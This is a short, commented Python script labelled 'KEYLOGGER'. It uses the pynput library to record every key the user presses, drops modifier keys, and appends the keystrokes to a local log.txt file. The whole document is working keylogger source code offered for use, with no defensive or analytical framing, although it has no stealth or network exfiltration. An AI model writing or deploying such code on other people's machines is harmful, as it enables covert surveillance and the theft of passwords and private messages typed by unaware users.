print('***KEYLOGGER***')
# Import the Listener class from the pynput.keyboard module to capture keyboard events
from pynput.keyboard import Listener

# Define a function to process and log keystrokes
def write_to_file(key):
    # Convert the captured key to a string and remove surrounding single quotes
    keydata = str(key).replace("'", "")

    # Define a list of keys to ignore, such as special keys like Shift, Enter, Backspace, etc.
    ignore_keys = ["Key.shift", "Key.shift_r", "Key.shift_l", "Key.enter",
                   "Key.backspace", "Key.ctrl", "Key.ctrl_r", "Key.ctrl_l", "Key.alt", "Key.alt_l", "Key.alt_r"]

    # Replace the space key with an actual space character for readability
    if keydata == "Key.space":
        keydata = " "
    # Check if the key is in the ignore list and skip logging if true
    elif keydata in ignore_keys:
        keydata = ""

    # Write the processed key data to a log file in append mode
    with open("log.txt", 'a') as f:
        f.write(keydata)

# Start the key listener to monitor and capture keyboard input
# The `on_press` argument specifies the function to call whenever a key is pressed
with Listener(on_press=write_to_file) as l:
    l.join()
